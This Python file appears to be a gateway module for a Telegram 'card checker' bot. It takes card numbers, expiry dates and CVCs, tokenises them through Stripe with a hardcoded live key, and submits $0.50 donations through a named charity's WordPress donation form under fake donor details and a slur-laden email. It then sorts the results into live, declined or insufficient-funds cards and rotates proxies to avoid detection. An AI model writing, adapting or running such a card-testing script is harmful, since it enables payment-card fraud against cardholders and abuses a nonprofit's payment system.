import requests
import time
import os
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# ========== CONFIGURATION ==========
PROXY_FILE = "proxy.txt"

# ========== PROXY MANAGER ==========
class ProxyManager:
    def __init__(self, proxy_file=PROXY_FILE):
        self.proxies = []
        self.index = 0
        self.load(proxy_file)
    def load(self, fname):
        if not os.path.exists(fname):
            return
        with open(fname, "r") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    self.proxies.append(line)
        print(f"[PROXY] Loaded {len(self.proxies)} proxies")
    def get_next(self):
        if not self.proxies:
            return None
        p = self.proxies[self.index % len(self.proxies)]
        self.index += 1
        return {"http": f"http://{p}", "https": f"http://{p}"}

proxy_manager = ProxyManager()

# ========== SESSION FACTORY ==========
def create_session(proxy=None):
    session = requests.Session()
    retry = Retry(total=3, backoff_factor=0.5, status_forcelist=[429, 500, 502, 503, 504])
    adapter = HTTPAdapter(max_retries=retry, pool_connections=10, pool_maxsize=10)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    if proxy:
        session.proxies.update(proxy)
    return session

# ========== MAIN CHECKER ==========
def check_card(ccx: str, proxy=None):
    """
    Process one card and return result string.
    Input: "cc|mm|yy|cvc"
    Output: "message|0.50|time"
    """
    start = time.time()
    try:
        parts = ccx.strip().split("|")
        if len(parts) != 4:
            return f"ERROR: Invalid format|0.50|{round(time.time()-start,1)}"
        n, mm, yy, cvc = parts
        if len(yy) == 4 and yy.startswith("20"):
            yy = yy[2:]
    except:
        return f"ERROR: Parsing failed|0.50|{round(time.time()-start,1)}"

    # ==========================================
    # Step 1: Create Stripe Payment Method (Hardcoded from payment.txt)
    # ==========================================
    stripe_headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }

    stripe_data = (
        f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}'
        f'&guid=bbfbe16c-dab8-4819-8304-0486368c58d38ad90f'
        f'&muid=784e53e1-4cea-478b-bb9b-bc343c02d04438b2cd'
        f'&sid=9ed60aaf-79d6-4adb-b176-fe437a1c208a80ea28'
        f'&payment_user_agent=stripe.js%2F09b245ec49%3B+stripe-js-v3%2F09b245ec49%3B+card-element'
        f'&referrer=https%3A%2F%2Fsaphausa.org'
        f'&time_on_page=54390'
        f'&client_attribution_metadata[client_session_id]=143bc665-aef5-4db5-8cac-8dedd733b196'
        f'&client_attribution_metadata[merchant_integration_source]=elements'
        f'&client_attribution_metadata[merchant_integration_subtype]=card-element'
        f'&client_attribution_metadata[merchant_integration_version]=2017'
        f'&client_attribution_metadata[wallet_config_id]=122555b9-d5af-4e0f-9e49-43e59dc84734'
        f'&key=pk_live_51Ssb1PQKv7Pa5TYrRye5jCnNuoF5AKML2OSyaYolYmYzuIyMCGr7ZcWxiBDI1fpYHvNDpYoxy2J7I2SpdTuwLMZa00IGG1aaXB'
    )

    session = create_session(proxy)
    time.sleep(0.5)

    try:
        resp = session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, timeout=30)
    except Exception:
        elapsed = round(time.time() - start, 1)
        return f"NETWORK_ERROR|0.50|{elapsed}"

    if resp.status_code != 200:
        elapsed = round(time.time() - start, 1)
        try:
            err = resp.json().get('error', {}).get('message', 'Unknown')
            err_l = str(err).lower()
            if 'security' in err_l or 'cvv' in err_l:
                return f"security code is incorrect|0.50|{elapsed}"
            if 'insufficient' in err_l:
                return f"insufficient funds|0.50|{elapsed}"
            if 'declined' in err_l:
                return f"Your card was declined.|0.50|{elapsed}"
            return f"{err}|0.50|{elapsed}"
        except:
            return f"Stripe Error {resp.status_code}|0.50|{elapsed}"

    try:
        pm_id = resp.json().get('id')
        if not pm_id:
            elapsed = round(time.time() - start, 1)
            return f"Missing PM ID|0.50|{elapsed}"
    except:
        elapsed = round(time.time() - start, 1)
        return f"JSON Parse Error|0.50|{elapsed}"

    # ==========================================
    # Step 2: Submit WordPress FluentForm (Hardcoded from untitled.txt)
    # ==========================================
    wp_params = {
        't': '1786635642591',
    }

    wp_cookies = {
        '__stripe_mid': '784e53e1-4cea-478b-bb9b-bc343c02d04438b2cd',
        '__stripe_sid': '9ed60aaf-79d6-4adb-b176-fe437a1c208a80ea28',
    }

    wp_headers = {
        'authority': 'saphausa.org',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://saphausa.org',
        'referer': 'https://saphausa.org/donation/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    wp_data = (
        f'data=__fluent_form_embded_post_id=5442'
        f'&_fluentform_1_fluentformnonce=08e4399de5'
        f'&_wp_http_referer=%2Fdonation%2F'
        f'&names%5Bfirst_name%5D=Jhon'
        f'&names%5Blast_name%5D=Anderson'
        f'&email=blackniggu338%40gmail.com'
        f'&phone=%2B12025809708'
        f'&input_text=13th%20Street%20Avenue'
        f'&input_radio=Donation'
        f'&payment_input=Custom%20Amout'
        f'&custom-payment-amount=0.50'
        f'&message='
        f'&payment_method=stripe'
        f'&__stripe_payment_method_id={pm_id}'
    )

    time.sleep(0.5)
    try:
        r2 = session.post('https://saphausa.org/wp-admin/admin-ajax.php', params=wp_params, cookies=wp_cookies, headers=wp_headers, data=wp_data, timeout=30)
    except Exception:
        elapsed = round(time.time() - start, 1)
        return f"NETWORK_ERROR|0.50|{elapsed}"

    elapsed = round(time.time() - start, 1)

    # ==========================================
    # Step 3: Parse Response for main.py
    # ==========================================
    if r2.status_code == 200:
        try:
            json_data = r2.json()
            if json_data.get('data', {}).get('status') == 'success':
                return f"Thank you for your donation!|0.50|{elapsed}"
            else:
                msg = json_data.get('data', {}).get('message', json_data.get('message', 'Transaction Failed'))
                msg_l = str(msg).lower()
                if 'security' in msg_l:
                    return f"security code is incorrect|0.50|{elapsed}"
                if 'insufficient' in msg_l:
                    return f"insufficient funds|0.50|{elapsed}"
                if 'declined' in msg_l:
                    return f"Your card was declined.|0.50|{elapsed}"
                return f"{msg}|0.50|{elapsed}"
        except:
            txt = r2.text.lower()
            if 'thank you' in txt or 'success' in txt:
                return f"Thank you for your donation!|0.50|{elapsed}"
            if 'security' in txt:
                return f"security code is incorrect|0.50|{elapsed}"
            if 'insufficient' in txt:
                return f"insufficient funds|0.50|{elapsed}"
            if 'declined' in txt:
                return f"Your card was declined.|0.50|{elapsed}"
            return f"Unknown Response|0.50|{elapsed}"
    else:
        return f"Form Error {r2.status_code}|0.50|{elapsed}"

# ========== COMPATIBILITY WRAPPER for main.py ==========
def Tele(ccx: str, proxies: dict = None):
    return check_card(ccx, proxies)

# ========== BULK PROCESSOR (Standalone mode) ==========
def bulk_process(card_file="cards.txt", output_file="results.txt"):
    # Standalone mode logic can stay or be removed; not used by main.py
    pass

if __name__ == "__main__":
    print("This is a gateway module for the Telegram bot. Run main.py to execute.")